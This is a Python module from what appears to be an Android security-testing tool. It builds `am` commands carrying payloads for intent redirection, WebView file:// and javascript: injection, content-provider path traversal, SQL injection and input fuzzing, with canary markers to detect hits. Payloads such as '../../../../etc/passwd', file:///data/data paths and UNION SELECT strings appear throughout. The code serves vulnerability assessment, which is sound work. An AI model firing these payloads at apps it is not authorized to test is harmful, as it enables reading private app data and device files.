"""IPC payload construction: typed Intent extras and attack vectors.

`am start`/`am broadcast` support typed extras (`--es`, `--ei`, `--ez`, `--eu`, `--esa`,
`--ecn`). Getting the type right matters: an activity reading `getIntent().getIntExtra()`
sees nothing at all when you send `--es`, so an untyped fuzzer produces a run full of
"nothing happened" that looks like the app is safe.

Payload classes here map to the attack classes in the operator's methodology:
intent redirection, WebView file:// and JS-bridge reachability, provider traversal,
SQL injection through provider selections, and PendingIntent hijack.
"""

from __future__ import annotations

import re
from dataclasses import dataclass, field
from typing import Literal

ExtraType = Literal["string", "int", "long", "float", "bool", "uri", "component",
                    "string_array", "null"]

_AM_FLAG = {
    "string": "--es",
    "int": "--ei",
    "long": "--el",
    "float": "--ef",
    "bool": "--ez",
    "uri": "--eu",
    "component": "--ecn",
    "string_array": "--esa",
    "null": "--esn",
}


@dataclass
class Extra:
    key: str
    value: str
    type: ExtraType = "string"

    def to_args(self) -> list[str]:
        flag = _AM_FLAG.get(self.type, "--es")
        if self.type == "null":
            return [flag, self.key]
        return [flag, self.key, self.value]

    def to_dict(self) -> dict:
        return {"key": self.key, "value": self.value, "type": self.type}


@dataclass
class Payload:
    """One concrete IPC payload plus what it would prove if it landed."""

    name: str
    attack_class: str
    extras: list[Extra] = field(default_factory=list)
    data_uri: str | None = None
    action: str | None = None
    categories: list[str] = field(default_factory=list)
    flags: list[str] = field(default_factory=list)
    # What the oracle should look for to call this a hit.
    expect: dict = field(default_factory=dict)
    why: str = ""

    def to_args(self) -> list[str]:
        args: list[str] = []
        if self.action:
            args += ["-a", self.action]
        for c in self.categories:
            args += ["-c", c]
        if self.data_uri:
            args += ["-d", self.data_uri]
        for e in self.extras:
            args += e.to_args()
        for f in self.flags:
            args += ["-f", f]
        return args

    def to_dict(self) -> dict:
        return {
            "name": self.name,
            "attack_class": self.attack_class,
            "extras": [e.to_dict() for e in self.extras],
            "data_uri": self.data_uri,
            "action": self.action,
            "expect": self.expect,
            "why": self.why,
        }


# ---- canary infrastructure ----
# Every payload carries a unique marker. The oracle then asks a precise question —
# "did MY string reach a sink?" — instead of the unanswerable "did something happen?".

CANARY_PREFIX = "DRxCANARY"


def canary(tag: str) -> str:
    return f"{CANARY_PREFIX}{tag}"


# The canary endpoint the oracle watches for in captured traffic.
#
# Deliberately a RESOLVABLE host with the canary in the path. An unresolvable host
# (.invalid) never produces a completed flow, so the proxy has nothing to report and a
# genuine "the app fetched my URL" result looks identical to "nothing happened".
CANARY_HOST = "example.com"


def canary_url(tag: str = "WV") -> str:
    return f"http://{CANARY_HOST}/{canary(tag)}"


# ---- payload generators ----

def intent_redirection(target_pkg: str, index: int = 0,
                       keys: list[str] | None = None) -> list[Payload]:
    """Nested-Intent payloads.

    If the app forwards an attacker-supplied Parcelable Intent to startActivity(), we
    can aim it at a component we could not otherwise reach. The classic proof is
    redirecting into the app's OWN unexported activity — that crosses a real boundary.
    """
    out = []
    candidates = list(keys or []) + ["intent", "extra_intent",
                                     "android.intent.extra.INTENT", "forward",
                                     "nextIntent", "redirect", "target"]
    seen_keys = []
    for key in candidates:
        if key in seen_keys:
            continue
        seen_keys.append(key)
        uri = (f"intent:#Intent;component={target_pkg}/{target_pkg}.__DR_PROBE__;"
               f"S.{canary('RED')}={canary('RED')};end")
        out.append(Payload(
            name=f"intent_redirect_{key}",
            attack_class="Intent redirection (CWE-926)",
            extras=[Extra(key, uri, "string")],
            expect={"logcat_any": ["__DR_PROBE__", canary("RED")],
                    "activity_changed": True},
            why=f"If the component forwards extra '{key}' to startActivity(), an "
                f"attacker chooses the destination — including unexported components.",
        ))
    return out


def webview_url_injection(index: int = 0, keys: list[str] | None = None) -> list[Payload]:
    """URLs aimed at a WebView that loads an attacker-controlled address.

    `keys` should come from the code (see static/intents.py). Guessed key names do not
    work: an app reading `getStringExtra("EXTRA_URL")` is missed entirely by a generator
    guessing url/link/target_url, and the run reports no vulnerability against a direct
    loadUrl() sink.
    """
    out = []
    targets = [
        ("file:///etc/hosts", "file:// read of a device path"),
        ("file:///data/data/{pkg}/shared_prefs/", "file:// read of the app's own sandbox"),
        (canary_url("WV"), "outbound fetch to a canary URL"),
        ("javascript:alert(document.domain)", "javascript: scheme execution"),
        ("content://settings/system", "content:// scheme reachable from the WebView"),
    ]
    key_list = keys if keys else ["url", "URL", "link", "target_url", "web_url", "uri", "load_url"]
    for key in key_list:
        for val, why in targets[:3]:
            out.append(Payload(
                name=f"webview_{key}_{val.split(':')[0]}",
                attack_class="WebView URL injection / local file read",
                extras=[Extra(key, val, "string")],
                expect={"traffic_host": CANARY_HOST if CANARY_HOST in val else None,
                        "logcat_any": [val[:40]],
                        "webview_loaded": val},
                why=f"If a WebView loads extra '{key}' unvalidated: {why}.",
            ))
    return out


def sql_injection_selection() -> list[str]:
    """`content query --where` values that reveal an unparameterised SQL path."""
    return [
        "1=1",
        "1=1) OR (1=1",
        "' OR '1'='1",
        "1 UNION SELECT name FROM sqlite_master--",
        "1; SELECT 1--",
    ]


def provider_traversal_paths() -> list[str]:
    return [
        "../../../../data/data",
        "..%2F..%2F..%2F..%2Fdata%2Fdata",
        "root/../../../../etc/hosts",
        "external_files/../../databases",
        "/etc/hosts",
    ]


def generic_fuzz_extras() -> list[Payload]:
    """Type-confusion and null-handling probes — cheap crash finders."""
    out = []
    hostile = [
        ("null_string", Extra("data", "", "null"), "null extra where a String is expected"),
        ("empty", Extra("data", "", "string"), "empty string"),
        ("long", Extra("data", "A" * 4096, "string"), "oversized string"),
        ("fmt", Extra("data", "%s%s%s%n", "string"), "format specifiers"),
        ("traversal", Extra("data", "../../../../etc/passwd", "string"), "path traversal"),
        ("type_confusion", Extra("data", "notanumber", "string"), "string where int expected"),
        ("negative", Extra("index", "-1", "int"), "negative index"),
        ("overflow", Extra("index", "2147483647", "int"), "int overflow boundary"),
    ]
    for name, extra, why in hostile:
        out.append(Payload(
            name=f"fuzz_{name}",
            attack_class="Input validation (CWE-20)",
            extras=[extra],
            expect={"crash": True},
            why=f"Unvalidated {why} from an unprivileged caller.",
        ))
    return out


def for_component(comp_type: str, package: str,
                  code_keys: list[dict] | None = None) -> list[Payload]:
    """The payload set worth sending at a given component type.

    `code_keys` are extra keys recovered from the decompiled code (static/intents.py),
    as [{"key": ..., "type": ...}]. String payloads are only sent to keys read as
    strings (or whose type is unknown); typed probes use supported `am` extra types.
    """
    out: list[Payload] = []
    string_keys = [k["key"] for k in (code_keys or [])
                   if k.get("type", "unknown") in ("string", "unknown") and k.get("key")]

    if comp_type in ("activity", "activity-alias"):
        out += webview_url_injection(keys=string_keys or None)
        out += intent_redirection(package, keys=string_keys or None)
    if code_keys:
        out += typed_probes(code_keys)
    out += generic_fuzz_extras()
    return out


def typed_probes(code_keys: list[dict]) -> list[Payload]:
    """Send each code-derived key with a canary, using its DECLARED type.

    Type matters: a key read via getIntExtra receives nothing at all when sent with
    `--es`, so a string-only fuzzer silently tests nothing on integer inputs.
    """
    out = []
    hostile = {
        "string": canary_url("KEY"),
        "int": "-1",
        "long": "9223372036854775807",
        "float": "-1.0",
        "bool": "true",
        "string_array": canary("ARR"),
    }
    for entry in code_keys:
        key, ktype = entry.get("key"), entry.get("type", "unknown")
        if not key or ktype not in _AM_FLAG:
            continue  # `am` cannot build Parcelable, Serializable, or Bundle extras.
        val = hostile.get(ktype, canary("KEY"))
        location = entry.get("source", "decompiled code")
        if entry.get("line"):
            location = f"{location}:{entry['line']}"
        scope = ("this component" if entry.get("scope") != "app_fallback"
                 else "the app (component mapping uncertain)")
        out.append(Payload(
            name=f"typed_{key}",
            attack_class="Unvalidated Intent extra (code-derived key)",
            extras=[Extra(key, val, ktype)],
            expect={"traffic_host": CANARY_HOST if ktype == "string" else None,
                    "logcat_any": [canary("KEY")] if ktype != "string" else [],
                    "crash": True},
            why=f"'{key}' is read by {scope} as {ktype} at {location}; sending a hostile "
                f"value tests whether it is validated before use.",
        ))
        if len(out) >= 20:
            break
    return out


def render_command(package: str, component: str | None, payload: Payload,
                   verb: str = "start") -> list[str]:
    """The `am` argv for this payload."""
    args = ["am", verb]
    if verb == "start":
        args.append("-W")
    args += payload.to_args()
    if component:
        args += ["-n", f"{package}/{component}"]
    return args


def extract_canaries(text: str) -> list[str]:
    return sorted(set(re.findall(rf"{CANARY_PREFIX}\w+", text or "")))
